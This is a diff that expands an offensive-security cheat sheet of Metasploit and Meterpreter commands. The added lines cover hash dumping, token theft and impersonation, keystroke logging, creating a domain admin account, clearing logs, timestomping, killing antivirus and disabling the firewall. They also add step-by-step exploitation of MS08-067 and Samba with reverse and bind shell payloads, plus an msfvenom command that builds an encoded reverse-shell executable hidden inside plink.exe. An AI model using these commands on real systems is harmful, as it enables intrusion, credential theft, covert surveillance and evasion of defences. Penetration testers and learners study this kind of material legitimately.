@@ -419,19 +419,89 @@ workspace -a my-lab1
 workspace my-lab1                              # choose workspace
 workspace -d my-lab3                           # delete
 
-# Meterpreter
+# Meterpreter - cmds
 #------------------------------------------------------------------------------
-run event_manager -c                  # covering the tracks
+add_user username password -h ip         # add user on remote machine
+add_group_user "Domain Admins" username -h ip   # add a username to the group
+background                # run your current meterpreter shell in the background
+clearev                   # clear the event log on the target machine
+execute -f cmd.exe -i     # execute cmd.exe and interact with it
+execute -f cmd.exe -i -t  # execute cmd.exe with all available tokens
+execute -f cmd.exe -i -H -t  # execute, all tokens and make it hidden process
 getuid
+getprivs                  # get as many privileges as possible on the target
+getsystem                 # attempt to elevate permissions to SYSTEM-level access through multiple attact vectors
+help
+hashdump                  # dump all hashes on the target
 irb
 ls
-migrate PID
+list_tokens -u            # available tokens on the target by user
+list_tokens -g            # available tokens of groups
+impersonate_token DOMAIN_NAME\\USERNAME
+keyscan_start             # start sniffing keystrokes on the remote target
+keyscan_dump              # dump the remote keys campured on remote target
+keyscan_stop              # stop sniffing keystrokes on the remote target
+
+steal_token PID           # steal tokens available for a given process and impersonate that token
+drop_token
+migrate PID               # migrate to specific process, use ps
 ps
+rev2self                  # revert back to the original user you used to compromise target
+reg command               # interact, create, delete, query, set
+run script_name
+run event_manager -c      # covering the tracks
 run migrate -f
-run killav                     # kill antivirus process
-timestomp                      # Covering my tracks
+run checkvm               # check if compromised system is virtual machine
+run vnc                   # run vnc on target
+run killav                # kill antivirus process
+reboot                    # reboot the target machine
+timestomp                 # Covering my tracks, change file attributes, sucha as creation date (antiforensics measure)
+setdesktop number         # switch to different screen based on who is logged in
+shell                     # drop into an interactive shell with all available tokens
 screenshot
-sysinfo
+sysinfo                   # show sysinfo on compromised target
+upload file               # upload file to the target
+download file             # download a file from the target
+use priv                  # load priv extension for extended meter libraries
+use incognito             # load incognito functions (token stealing, impersonation)
+use sniffer               # load the sniffer module
+sniffer_interfaces        # list of available interfaces
+sniffer_dump interfaceID pcapname   # start sniffing on the remote target
+sniffer_start interfaceID packet-buffer  # start sniffing with specific range for package
+sniffer_stats interfaceID                # grab statistical info
+sniffer_stop interfaceID
+
+# Meterpreter Post exploitation commands
+use priv
+getsystem
+ps
+steal_token 1111
+shell
+#on win
+  net user metasploit passw0rd /ADD /DOMAIN
+  net group "Domain Admins" metasploit /ADD /DOMAIN
+use priv
+getsystem
+hashdump
+
+# Capture keystrokes on target machine
+ps
+migrate 1212
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# use incognito
+use incognito
+list_tokens -u
+use priv
+getsystem
+list_tokens -u
+impersonate_token SOMEUSER\\Administrator
+
+run getcountermeasure
+run getcountermeasure -h      # display help menu
+run getcountermeasure -d -k   # disable win firewall, kill all counter
 
 # Capturing Keystroke
 meterpreter> ps
@@ -494,6 +564,19 @@ echo run >> rf.rc
 ./msfconsole -r rf.rc
 # or 2.
 msf > resource name_of_resource_script.rc
+
+# example of resource_file.rc
+  version
+  load sounds           # load plugin
+  use exploit/windows/smb/ms08_067_netapi
+  set RHOST 192.168.10.1
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  set LHOST 192.168.100.1
+  exploit
+msfconsole
+resource resource_file.rc
+
+
 
 # Inporting nmap result into Metasploit
 #------------------------------------------------------------------------------
@@ -574,14 +657,57 @@ msf> load db_autopwn
        # e > all targets; t > all matching modules; r > reverse shell payload
        # x > select exploit module based on vulnerability p > open ports
 
-# MS08-067 - Remove Procedure Call [RPC] service
-msf > search ms08_067
-    > use windows/smb/ms08_67_netapi
 
+# Exploiting WINDOWS
+#------------------------------------------------------------------------------
+  # msf console cmds
+  search mssql
+  show auxiliary
+  show exploits
+  show options
+  show payloads
+  show targets
+  set RHOST 192.168.1.1
+  set TARGET 3             # show targets list of all systems
+  show options
+  unset RHOST
+  save
+  nmap -sT -A --script=smb-check-vulns -P0 192.168.10.1
+  # MS08-067 - Remove Procedure Call [RPC] service
+  msf > search ms08_067
+      > use windows/smb/ms08_67_netapi
+      > set PAYLOAD windows/meterpreter/reverse_tcp
+      > show targets
+      > show options
+      > exploit
+      > sessions -l
+      > sessions -i 1
+      > shell
+
+# Exploiting Ubuntu
+#------------------------------------------------------------------------------
+msf > nmap -sT -A -P0 192.168.1.10
+    > search samba
+    > use linux/samba/lsa_transnames_heap
+    > show payloads
+    > set payload linux /x86/shell_bind_tcp
+    > set LPORt 8080
+    > set RHOST 192.168.1.10
+    > exploit
 
 # Avoiding Detection
 #------------------------------------------------------------------------------
-# Creating Stand-Alone Binaries with msf
+# Creating Stand-Alone Binaries with ms
+msfvenom -l payloads                     # list all payloads
+msfvenom -l encoders                     # list all encoding
+# create exe file with encoding
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+
+# multi encoding
+
+
+
+
 # multi encoding with shikata_ga_nai
 # custom executable templates
 # Launching a Payload Stealthily
